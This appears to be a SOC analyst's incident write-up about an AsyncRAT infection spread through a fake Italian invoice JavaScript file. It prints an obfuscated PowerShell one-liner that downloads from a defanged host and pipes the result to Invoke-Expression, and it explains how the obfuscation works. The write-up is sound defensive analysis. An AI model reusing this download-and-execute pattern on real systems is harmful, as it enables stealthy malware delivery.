# incident-AsyncRAT

As a SOC analyst, I recently worked on an intriguing incident involving "Execution via PowerShell" that was flagged by CrowdStrike Falcon. The alert was related to AsyncRAT, a stealthy malware variant known for its ability to establish intermittent, non-persistent communication with a C2 server using protocols like HTTP/S or DNS. It often leverages encryption and obfuscation to evade detection, making it a particularly challenging threat to tackle.

Timeline of events observed:

HOST > winlogon.exe > userinit.exe > explorer.exe > msedge.exe > wscript.exe > powershell.exe

The command line involved in the incident was:
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noprofile -executionpolicy bypass -WindowStyle hidden -C "Set-Alias -Name mint -Value ('{0}{1}' -f 'cu','rl'); mint -useb hXXp[:]//XXXXXXXXX.XX/1.php?s=flibabc13 | &('{1}{0}' -f 'x', 'ie')"

Breaking down the command, it was observed:

Alias Obfuscation with:
string formatting (-f) to concatenate cu and rl 
curl is an alias for Invoke-WebRequest

Downloading Payload: 
The -useb flag is short for -UseBasicParsing, which simplifies the web request by avoiding the Internet Explorer engine.

Code Execution: 
The pipe |  sends the downloaded script content to iex  (short for Invoke-Expression ), executing it as PowerShell code.

Further investigation revealed that a JavaScript file was downloaded:
"C:\Windows\System32\WScript.exe" "C:\Users\USERNAME\Downloads\FatturaXXXXXXXXX.js"

Upon analyzing the URL on VirusTotal, it was confirmed as malicious. The JavaScript file was also flagged as malicious after being run in Joe Sandbox, revealing a 100% malicious behavior.

Response and escalation performed:
Fortunately, the host was already contained, and all processes related to the incident were blocked. I sent an escalation report to the client, detailing the findings and IOCs.

I also performed further investigation to trace the event's origin. I investigated the wscript.exe process using the query field to search for the JavaScript file name, "FatturaXXXXXXX.js," and discovered a log entry with a previously unseen Host URL. Analyzing this URL in Joe Sandbox showed page was not reacheble anymore and checking VirusTotal for the domain returned as 2/97 malicious. 

Interestingly, the client is an Italian company, and "fattura" means "invoice" in Italian. It appears to be part of a broader campaign targeting various countries using fake invoices to infect hosts.
